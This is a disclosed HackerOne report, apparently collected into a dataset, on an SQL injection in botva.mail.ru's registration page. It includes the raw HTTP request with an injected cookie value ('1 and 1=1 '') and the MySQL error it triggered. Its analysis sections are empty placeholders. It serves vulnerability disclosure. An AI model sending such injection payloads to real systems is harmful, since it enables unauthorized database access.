---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '10081'
original_report_id: '10081'
title: HackerOne Report 10081
weakness: SQL Injection
team_handle: mailru
created_at: '2014-04-28T03:47:13.161Z'
disclosed_at: '2014-08-16T07:22:06.669Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- sql-injection
---

# HackerOne Report 10081

## Metadata

- HackerOne Report ID: 10081
- Weakness: SQL Injection
- Program: mailru
- Disclosed At: 2014-08-16T07:22:06.669Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

2. для SQL inj.
GET /registration.php HTTP/1.1
Host: botva.mail.ru
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru,en-us;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: trid=13986459646865; partner_rt_ref=http%3A%2F%2Fbotva.mail.ru%2Fregistration.php; partnerid=st; register_race=0; register_step=1%20and%201%3d1%20'; lol_filter=1;
Connection: keep-alive
Cache-Control: max-age=0


UPDATE  botva_all_logs.register_logs SET `dateupdate` = '1398656471'  , `last_step` = '1 and 1=1 \\\''  WHERE last_step < 1 and 1=1 \' and sessionid='13986459646865'  <br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' and sessionid='13986459646865'' at line 1

в операторе WHERE last_step < 1 паратры не экранизируются.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
